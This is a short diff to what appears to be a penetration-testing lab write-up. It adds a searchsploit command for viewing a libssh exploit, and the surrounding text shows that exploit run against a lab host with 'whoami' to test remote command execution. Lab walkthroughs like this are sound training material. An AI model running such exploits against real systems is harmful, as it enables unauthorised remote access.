@@ -13,6 +13,7 @@ searchsploit libssh
 ![alt text](./img/firstmachine02.PNG?raw=true)  
 
 Reading the code it asks 3 arguments... hostname, port and command  
+searchsploit -x linux/remote/46307.py  
 ![alt text](./img/firstmachine03.PNG?raw=true)  
 
 python3 46307.py 10.2.0.5 8140 whoami  
